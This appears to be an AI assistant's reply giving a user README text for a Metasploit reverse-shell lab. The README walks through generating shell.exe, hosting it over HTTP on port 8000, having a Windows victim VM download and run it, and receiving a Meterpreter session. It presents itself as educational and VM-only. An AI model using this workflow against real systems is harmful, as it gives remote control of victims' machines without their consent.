Absolutely, Aarya! Here's the **exact `README.md` content** you can copy and paste directly into your GitHub repo:

---

### ✅ 📄 `README.md` (copy this)

````markdown
# Metasploit Reverse Shell Lab

This is a simple and educational reverse shell lab setup using **Metasploit**, built for safe testing in virtual machines only.

The automation is handled by a Bash script: `scripts/run_lab.sh`.

---

## 🧰 Requirements

- Kali Linux (with Metasploit Framework installed)
- Windows 10 Virtual Machine (victim)
- Both VMs connected to the same local network (e.g., NAT, Host-only)

---

## 🛠 How to Use

### 🔹 1. Clone the Repo

```bash
git clone https://github.com/<your-username>/metasploit-reverse-shell-lab.git
cd metasploit-reverse-shell-lab/scripts
````

### 🔹 2. Make the Script Executable

```bash
chmod +x run_lab.sh
```

### 🔹 3. Run the Script

```bash
./run_lab.sh <your-kali-ip> 4444
```

It will:

* Generate a payload: `shell.exe`
* Host it over HTTP on port `8000`
* Start a Metasploit listener waiting for the connection

---

## 💻 On the Windows VM (Victim)

1. Open a browser
2. Go to: `http://<kali-ip>:8000/shell.exe`
3. Download and run `shell.exe`

---

## ✅ If Successful

You’ll see a Meterpreter session in your Kali terminal:

```
[*] Meterpreter session 1 opened
meterpreter > sysinfo
meterpreter > screenshot
```

You now have full post-exploitation access inside your virtual lab.

---


## ⚠️ Legal & Ethical Notice

This project is for **educational use only** inside a virtual environment you fully control.

Do **NOT** use these techniques on real networks or systems you do not have permission to test.

---
